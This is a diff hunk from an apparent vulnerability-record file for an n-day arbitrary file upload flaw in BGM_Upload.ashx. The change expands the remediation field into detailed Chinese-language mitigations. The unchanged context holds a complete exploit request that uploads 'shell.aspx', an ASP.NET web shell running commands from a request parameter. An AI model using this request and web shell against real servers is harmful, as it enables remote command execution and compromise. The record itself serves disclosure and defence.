@@ -9,7 +9,7 @@ detail = """POST /BGM_Upload.ashx HTTP/1.1 Host: target Content-Type: multipart/
 Content-Disposition: form-data; name="file"; filename="shell.aspx"
 <%@Page Language="C#"%><%Response.Write(System.Diagnostics.Process.Start(Request["cmd"]).StandardOutput.ReadToEnd());%>
 ------Boundary--"""
-fix = "联系厂商升级"
+fix = "联系博硕厂商获取安全补丁；对 BGM_Upload.ashx 添加文件类型白名单校验；限制上传路径不可包含 ../ 遍历序列；Web 目录禁止执行动态脚本；限制该接口仅允许内网访问。"
 date = 20260301
 label = "nday"
 cve = "TVD-2026-04901"
